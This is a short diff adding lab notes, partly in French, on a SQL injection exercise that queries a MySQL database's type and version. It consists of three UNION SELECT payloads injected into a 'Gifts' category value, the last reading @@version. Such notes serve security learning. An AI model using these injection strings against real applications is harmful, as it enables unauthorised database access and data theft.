@@ -1,0 +1,9 @@
+#SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+Objectif : effectuer une recherche sur la suite de caractère que cela affiche '8.0.39-0ubuntu0.20.04.1'
+
+Gifts' UNION SELECT NULL,NULL -- comment
+
+Gifts' UNION SELECT 'NULL','NULL' -- comment
+
+Gifts' UNION SELECT @@version,'NULL' -- comment
